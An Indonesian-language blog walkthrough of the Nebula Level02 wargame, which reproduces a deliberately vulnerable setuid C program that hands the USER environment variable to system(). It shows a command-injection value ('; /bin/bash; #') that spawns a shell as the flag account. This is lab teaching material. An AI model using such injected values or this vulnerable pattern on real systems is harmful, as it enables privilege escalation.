+++
author = "kernel-panic"
categories = ["Security", "Nebula"]
date = "2018-01-10T05:30:30+00:00"
description = "Security Wargames"
featured = "x44905647871.jpg"
featuredalt = "Nebula Level02"
featuredpath = "https://beeimg.com/images"
linktitle = ""
title = "Exploit Exercises - Nebula Level02"
type = "post"

+++
Dalam {{< url-link "level02" "https://exploit-exercises.com/nebula/level02/" "target">}} ini menginstruksikan kita untuk meninjau kode C yang rentan dan menemukan vektor serangannya. Program ini membahas kerentanan dari {{< url-link "tingkat sebelumnya" "https://muhammadzakyzulfiqor.xyz/article/nebula-level01/" "target">}} namun ada vektor baru.

Source code untuk referensinya disertakan di bawah ini:

    #include <stdlib.h>
    #include <unistd.h>
    #include <string.h>
    #include <sys/types.h>
    #include <stdio.h>
    
    int main(int argc, char **argv, char **envp)
    {
    char *buffer;
    
    gid_t gid;
    uid_t uid;
    
    gid = getegid();
    uid = geteuid();
    
    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);
    
    buffer = NULL;
    
    asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
    printf("about to call system(\"%s\")\n", buffer);
    
    system(buffer);
    }

Seperti yang Anda lihat, "echo" dipanggil oleh path absolutnya tetapi getenv("USER")) memanggil variabel lingkungan $USER. Seperti masalah di level01, variabel ini diatur dalam shell saat ini yang dapat dimanipulasi.

Mari kita modifikasi variabel $USER untuk memasukkan input yang berbeda.

    level02@nebula:/home/flag02$ echo ${USER}
    level02
    level02@nebula:/home/flag02$ USER="; /bin/bash; #"
    level02@nebula:/home/flag02$ echo ${USER}
    ; /bin/bash; #

Seperti yang dapat dilihat dalam kode di atas, saya memodifikasi variabel lingkungan USER yang menjadi berisi "; /bin/bash; #".

Titik  koma ditambahkan untuk menghentikan perintah saat ini dan memulai yang baru, yang memungkinkan kita menghentikan panggilan "echo" dan _spawn a shell_. Diakhir, saya menambahkan  sebuah _octothorp (#)_ untuk memberi komentar pada garis "is cool" yang akan menciptakan keluaran yang salah.

Mari kita jalankan flag02 dan amati hasilnya:

    level02@nebula:/home/flag02$ id
    uid=1003(level02) gid=1003(level02) groups=1003(level02)
    level02@nebula:/home/flag02$ ./flag02
    about to call system("/bin/echo ; /bin/bash; # is cool")
    
    flag02@nebula:/home/flag02$ id
    uid=997(flag02) gid=1003(level02) groups=997(flag02),1003(level02)
    flag02@nebula:/home/flag02$ getflag
    You have successfully executed getflag on a target account

Dan yaps, trik ini berhasil. Tingkat ini menunjukkan bahaya penggunaan variabel lingkungan dalam script dan masukan pengguna yang dipercaya.

<div class="videoyoutube"><div class="video-responsive"><iframe allowfullscreen="1" class="embedded-video-large" src="https://www.youtube.com/embed/hfsHjJbE6J8?rel=0"></iframe></div></div>